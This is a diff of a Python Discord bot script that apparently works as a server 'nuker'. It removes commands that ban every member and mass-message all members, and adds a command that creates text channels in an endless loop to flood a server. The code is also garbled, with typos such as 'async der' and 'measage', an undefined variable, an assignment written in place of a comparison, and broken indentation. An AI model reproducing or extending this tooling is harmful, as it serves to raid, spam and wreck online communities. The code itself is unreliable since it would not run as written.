@@ -69,20 +69,13 @@ async def cda(ctx):
             pass   
 
 @client.command()
-async def banall(ctx, reason=None):
-  await ctx.message.delete()
-  for member in ctx.guild.members:
-    await member.ban(reason=reason)
-
-@client.command()
-async def dmall(ctx, *,args=None):
-  if args=None:
-     members=ctx.guild.members
-     for member in members:
-        try:
-            await member.send(f"{args}")
-            print("." +args+ " has been sent to " + member.name)
-        except:
-            print("i coundnt send " + args + "to " + member.name)
+async der cc(ctx, *,message):
+  for i in range(1):
+        await guild.create_text_channel(f"{message}")
+    while True:
+        for channel in guild.text_channels:
+            for i in range (1):
+                await guild.create_text_channel(f"{measage}")
+ 
 
 client.run(token)
